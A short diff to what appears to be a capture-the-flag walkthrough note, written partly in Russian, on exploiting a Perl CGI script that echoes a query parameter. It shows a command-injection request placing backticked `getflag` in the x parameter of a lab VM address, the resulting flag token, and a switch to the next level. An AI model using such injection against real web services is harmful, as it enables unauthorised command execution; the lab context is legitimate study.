@@ -17,7 +17,9 @@ x(param("x"));
 
 #Он принимает в себя параметр X и через echo выводит результат
 #Чтобы исполнить скрипт используем curl OurIP Port(localhost:4747)/ScriptName.pl?x=`getflag`
-http://192.168.56.101:4747/?x=`getflag`
+Вводим в браузере на Маке адрес:
+    http://192.168.56.101:4747/?x=`getflag`
+Выдает:
 Check your flag.Here is eour token : ne2searoevaevoem4ov4ar8ap
 
 su level05
